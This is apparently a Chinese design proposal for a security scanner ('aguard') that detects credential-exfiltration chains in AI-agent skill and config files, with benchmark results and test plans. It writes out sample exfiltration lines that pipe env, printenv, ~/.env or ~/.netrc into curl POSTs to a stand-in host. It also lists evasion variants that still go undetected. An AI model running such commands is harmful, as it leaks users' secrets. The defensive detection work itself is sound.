<!-- SPDX-License-Identifier: MIT -->
# 010 — `env | curl` 把整个环境发出去,aguard 一条发现都不给

- **来源**:新发现(2026-09-21,首轮 `make bench` 跑 agent-artifact-corpus 的 113 个漏检里的一类)
- **依赖**:无
- **分支**:`p/010-env-dump-credential-leg`

## 问题

外泄链(`EXFIL-001/003`)要两条腿:读凭证 + 出网。"读凭证"这条腿今天只认三种写法:
凭证**文件名**(`.ssh/`、`.aws/`、`/etc/passwd`、`id_rsa`)、带 secret 字样的**环境变量名**(`$GITHUB_TOKEN`),
以及 **JS/Python 的整环境导出**(`process.env`、`os.environ`)。

shell 里把整个环境倒出来的写法不在里面,而那正是攻击者最省事的一行。实测(`aguard check`,
`--no-reputation`,同一个 `curl -s -X POST --data-binary @- https://x.example/e` 接在后面):

| 前半句 | 结果 |
|---|---|
| `cat ~/.aws/credentials \|` | `EXFIL-001` high(正确) |
| `env \|` | **无** |
| `printenv \|` | 只有 `EXFIL-004` medium,链不成 |
| `export -p \|` · `set \|` | **无** |
| `cat /proc/self/environ \|` | **无** |
| `cat ~/.env \|` · `base64 < "$HOME/.env"` | **无** |
| `cat ~/.netrc \|` | **无** |
| `env \| grep -E 'TOKEN\|SECRET' \|` | **无**(secret 字样在,但环境读只认 `process.env`/`os.environ`) |

后果:闸门在 high 拦,这些全部放行。语料里 300 个恶意样本漏了 113 个,其中至少 10 个就是这一个形状——
规避矩阵(evasion matrix)用同一个 `env | curl` payload 做了 8 种变形,**原样那个都没拦下**,
于是词法归一化(`logicalLines`)本来能追回的 5 种变形也跟着全漏。`.env` 文件那一支另有 3 个
(`base64 < "$HOME/.env"` 拼进 URL)。

**误报代价已量过**:良性集 3220 个真实文件里,shell 整环境导出与网络调用**同一行**共现 **0 行**;
凭证文件名(`.env`/`.netrc`/`.npmrc`/`.git-credentials`/`.kube/config`/`.docker/config.json`)与网络同行
共现 **1 行**,是 `llms.txt` 里的文档链接(`roleDoc`,链不在它上面跑)。裸词 `.env` 与网络同行有 10 行
("copy `.env.example`"这类),所以 `.env` 必须锚在**路径形态**上(`~/.env`、`$HOME/.env`、`< .env`、`cat .env`),
不能是裸词。

## 初步方向

只动 `credentialLine`(`internal/detect/rules_data.go`)这一条腿,不加规则、不改 severity:

1. 加一个 shell 侧的整环境导出形态进凭证腿:`env`/`printenv`/`export -p`/`set` 在**命令位置**
   (复用 `cmdPos`,和隐蔽信道那半同一约束,否则散文里的 "set the variable" 就成半条链)且后面是
   `|`/`>`/行尾,加 `/proc/self/environ`。`EXFIL-004` 那条普通规则保持不动,它管"倒出来打印",链管"倒出来发走"。
2. `credFileRE` 加凭证文件名,`.env` 只认路径形态。
3. 反向断言:`cat ~/.aws/credentials | curl` 仍是 high;`cp .env.example .env` 加同文件里一个
   `curl https://docs...` 链接**不**成链;规避矩阵 8 个样本里 `plain` 加 5 个词法变形翻成 malicious,
   `base64-wrapper` 和 `split-across-files` **按设计仍漏**(那是解码和跨文件两条别的路,不在本条范围)。
4. 验收用 `make bench` 前后两份 verdicts 的 diff:恶意侧翻回的个数、良性侧新增误报的个数,两个都写。

<!-- ===== design 段 ===== -->

## 按文件重量的误报代价(2026-09-21,设计阶段修正)

draft 里"同一行共现 0 行"用错了尺子:链是**同一文件**内两条腿即成。按文件、只算链会跑的角色
(`SKILL.md`/`CLAUDE.md` 与脚本,共 2,777 个良性文件),且文件里另有网络腿:

| 凭证腿形态 | 会多出凭证腿的良性文件 | 其中是什么 |
|---|---:|---|
| `env`/`printenv`/`set`/`export -p` 命令位置 + **行尾也算** | 17 | 15 个是 Markdown 的 ```` ```env ```` 围栏和散文里的 "set"/C# 的 `{ get; set; }`,1 个是 `var=$(env \| fzf …)` |
| 同上,但后面**必须是 `\|` 或 `>`** | **1** | `env \| fzf \| cut`(交互式挑变量名,真实共现) |
| 凭证文件名,路径形态 | 4 | 2 个是散文里的 `` `.npmrc` ``;`cp … $HOME/.kube/config`(k8s 安装);`source .env`(bun 开发流程) |
| 裸词 `.env` | 155 | 到处都是,不可用 |

结论写进方向:整环境导出后面必须跟 `|` 或 `>`;凭证文件必须是**被读取的路径形态**;`.kube/config` 与
`.docker/config.json` **不进清单**(安装脚本天天写它们,恶意语料一个也没用到)。预期新增良性误报 **≤ 2 个文件**
(fzf 那个、`source .env` 那个),两个都要在验收里点名,不许"约等于零"。

## 完成的判据

- [ ] `TestDetect_CredentialLegShellEnvDump`(新,`internal/detect/detect_test.go`)表驱动:`env |`、`printenv |`、
  `set |`、`export -p |`、`env >`、`cat /proc/self/environ |` 各接同文件一条 `curl -X POST https://x.example/e` →
  `EXFIL-001` high;**同一表里**反例:```` ```env ````、`set -e`、`set -x`、`env FOO=bar ./run`、`"set the variable"`、
  `{ get; set; }`、`printenv HOME` 加同文件 curl → **不**成链。
- [ ] `TestDetect_CredentialLegCredentialFiles`(新)表驱动:`cat ~/.env`、`base64 < "$HOME/.env"`、`. ./.env`、
  `cat ~/.netrc`、`cat ~/.npmrc`、`~/.git-credentials`、`~/.pypirc` 加同文件 curl → 成链;反例:散文 `` `.npmrc` ``、
  `.env.example`、`cp .env.example .env`、`filePath.endsWith(".env")`、`$HOME/.kube/config` 加同文件 curl → **不**成链。
- [ ] 反向断言(现有测试一条不改仍绿):`TestDetect_ExfilChain`(`~/.aws/credentials`)、`TestDetect_CredentialLegNeedsASecret`、
  `TestEXFIL004_EnvironCopyForSubprocessIsNotExfil`、`TestDetect_ExfilChainLoopback`。
- [ ] 语料对照(`make bench` 修前后两份 `bin/bench/high/verdicts.jsonl` 的 diff,写进「完成」):
  恶意侧 `benign→malicious` **≥ 10** 且点名(evmx-plain、evmx-blank-padding、evmx-line-continuation、
  evmx-quote-splitting、evmx-zero-width、evmx-unicode-confusable、sg-plain-exfil-post、sg-judge-self-injection、
  sg-newline-canyon、sg-cover-link-offload、sg-vercel-skills-sh-pack);良性侧 `benign→malicious` **≤ 2 且逐个点名**;
  hard-negative 无变化;`evmx-base64-wrapper` 与 `evmx-split-across-files` **仍为 benign**(按设计,见「不做什么」)。
- [ ] 真机:`bin/aguard scan --root ~/.claude` 修前后 `Overall` 与 high 数不变,头部贴进「未决问题」(`internal/detect` 改动的例行要求)。
- [ ] `make verify` 绿;`make docs` 无漂移(不加规则 ID,`docs/rules.md` 应当零改动)。

## 不做什么

- **不加规则 ID,不动任何 severity**,不动 `EXFIL-004`、`encodeRE`、`networkRE`、`cmdPos`。只改 `credentialLine` 调用的两个正则。
- **不做解码后再扫**(`evmx-base64-wrapper`、`sg-base64-obvious` 那一类)和**跨文件链升级**(`evmx-split-across-files`);
  它们按设计仍漏,并在验收里作为"仍为 benign"的断言存在。
- **不碰** `nc -e` 反弹 shell 只给 low(`BD-003`)、Python `urllib` 出网不认 —— 各自另开 proposal。
- **不改 corpus 仓**,不改 `hack/corpus-runner`(它是本地工具,不在任何 PR 里)。
- **不在 README、architecture 或任何用户可见文档里写比率**;spec 与 `.claude/rules/detect.md` 只同步"凭证腿多了哪些形态"一句。

## 不能说什么

- 不写"修复了环境变量外泄检测"这类整体陈述,只列增加的形态;裸词 `.env` 与 `.kube/config` 明确**不**认,文档要写出来。
- bench 的数字只进本 proposal 和 `docs/planning/corpus-benchmark.zh-CN.md`,按来源、带 n、写阈值 high、信誉库关闭、127 个 uncovered。
- 良性侧新增的那 ≤ 2 个误报要**点名**,不得写成"几乎为零"。

## 工作项

| W | 一句话 | 提交信息(不写 sha,rebase 会改) |
|---|---|---|
| 1 | 两组表驱动测试先红,正反例齐 | `detect: tests — shell env dumps and credential files must complete the exfil chain (P-010)` |
| 2 | `credentialLine`:整环境导出(命令位置 + `\|`/`>`)与凭证文件路径形态进凭证腿 | `detect: env/printenv/set/export -p piped out, and .env/.netrc/.npmrc read by path, count as the credential leg (P-010)` |
| 2b | 语料对照暴露两类误报(Markdown 表格行、散文里的 home 路径),收紧:管道后必须接命令、整行不以 `\|` 开头;凭证文件必须跟读取动词 | `detect: a table row is not a pipeline and a prose path is not a read — tighten the new credential leg (P-010)` |
| 3 | spec 与 detect.md 各同步一句;bench 前后对照与真机头部写进 proposal | `docs: spec and detect note the widened credential leg; corpus before/after recorded (P-010)` |

## 未决问题

每条带建议答案;答完写"**已决(日期)**:…"。

**已决(2026-09-21)**:领导对五条全部按建议答案同意 —— 1 都留;2 接受并点名;3 按清单,`.kube/config` 与 `.docker/config.json` 不进;4 `set` 进,后接 `|` 或 `>`;5 追加一句不新开节。

1. **`printenv | curl` 会同时出 `EXFIL-004`(medium)和 `EXFIL-001`(high),要不要像 EXFIL-003 那样压掉一条?**
   建议:**都留**。它们是两个事实(倒出来 vs 发出去),同一维度只取最高,分数不重罚;EXFIL-003 替代 EXFIL-001
   那条纪律针对的是"同一事实报两遍",这里不是。
2. **`env | fzf` 那 1 个良性文件会成为新误报,接受还是排除管道目标是交互/过滤工具的情况?**
   建议:**接受并点名**。加"管道目标白名单"就得回答 `env | grep TOKEN | curl` 为什么不算,那是真攻击;
   1/2777 的代价比一条要解释的例外便宜。
3. **凭证文件清单定为 `.env`(含 `.env.local` 这类后缀,路径形态)、`.netrc`、`.npmrc`、`.git-credentials`、`.pypirc`、`/proc/self/environ`;
   `.kube/config`、`.docker/config.json`、`.ssh/`(已有)之外不再加?** 建议:**是**。前两个是安装脚本的常客,恶意语料一个都没用。
4. **`set |` 要不要进?** `set` 输出的是 shell 变量加函数,超集但同样含全部环境。建议:**进**,后面必须是 `|` 或 `>`;
   `set -e`/`set -o` 这类由"后接管道或重定向"自然排除。
5. **spec 同步的位置**:§ 形状检查那一段末尾(现有 "`envWholeRE` 放行了 `.items()…`作外泄链的凭证腿" 一句)追加 shell 形态与凭证文件。
   建议:**追加一句,不新开节**。


### 实现阶段记录(2026-09-21)

**第一版 W2 在语料上的对照**:恶意 `benign→malicious` 12,良性 5 —— 判据 ≤ 2 不达标。五个良性的凭证腿证据:两个是 Markdown
表格行 `| … | storage_path | env |`(`env` 夹在两根竖线之间,前一根被 `cmdPos` 当成管道),三个是散文 "configure it in
`~/.claude/.env`"(home 路径前缀单独就算了读)。设计阶段按文件量出的两个预期误报(`env | fzf`、`source .env`)反而**都没翻**:
原因见未决 6:两个文件修前就是 high。

**W2b 收紧后**(`make bench`,aguard @ 本分支,阈值 high,信誉库关,inbox 关,HOME 隔离;修前基线是 dev @ 32fcb94 的同一命令):

```
恶意 benign→malicious 11:
  evmx-plain · evmx-blank-padding · evmx-line-continuation · evmx-quote-splitting · evmx-zero-width · evmx-unicode-confusable
  sg-plain-exfil-post · sg-judge-self-injection · sg-newline-canyon · sg-vercel-skills-sh-pack · dd-ronyparra-fake-dep-check-skill
良性 benign→malicious 0 · hard-negative 无变化 · uncovered 127 不变
按设计仍漏:evmx-base64-wrapper(解码后再扫)· evmx-split-across-files(跨文件,只到 EXFIL-002)· sg-cover-link-offload(纯散文
  "contents of ~/.netrc",第一版靠 home 路径翻了,收紧后退回 —— 这是 C 类,不该由路径正则来捡)
corpus score 良性侧:automatelab 22/353 · harvested 35/387 · skillet-wild 26/474 · skillmd-138k 133/1996 —— 与修前逐个相等
真机 scan --root ~/.claude 修前后:overall 69 · 46 artifacts · high 8 / medium 29 / low 8,完全相同
```

判据对照:两组新测试绿(正 9 + 反 7,正 8 + 反 8);四条反向断言未改仍绿;恶意 ≥ 10 ✓(11);良性 ≤ 2 ✓(0);
两个按设计仍漏 ✓;真机不变 ✓;`docs/rules.md` 零改动 ✓。

6. **设计阶段预测的两个良性误报(`env | fzf`、`source .env`)为什么没翻?** **已决(2026-09-21,查明)**:两个文件修前就已经是 high ——
   前者有 `curl -sS https://…/install.sh | bash`(`EXEC-001`),后者本来就有一条 `EXFIL-001`。新凭证腿确实在这两个文件上形成了
   (`check` 里都能看到 `EXFIL-001`),但 verdict 早就是 malicious,diff 里自然不出现。设计阶段的按文件测量只问"会不会多一条腿",
   没问"这个文件本来是什么 verdict";下次量误报代价先和基线 verdicts 做交集。


## 完成

```
合入:PR #9 https://github.com/basdotio/agent-guard/pull/9(2026-09-21;sha 合入后用 git log --grep P-010 找)
发布:v0.11.0
证据:TestDetect_CredentialLegShellEnvDump、TestDetect_CredentialLegCredentialFiles(internal/detect/detect_test.go);
      语料 make bench 阈值 high:恶意拦下 60 → 71(+11,点名见「实现阶段记录」),良性误报 219 → 219(+0),hard-negative 4 → 4,
      uncovered 127 不变;exfiltration collected 19/44 → 24/44;真机 scan --root ~/.claude overall 69 → 69;
      反向断言:TestDetect_ExfilChain(~/.aws/credentials 仍 EXFIL-001 high)、evmx-base64-wrapper 与 evmx-split-across-files 仍 benign
```
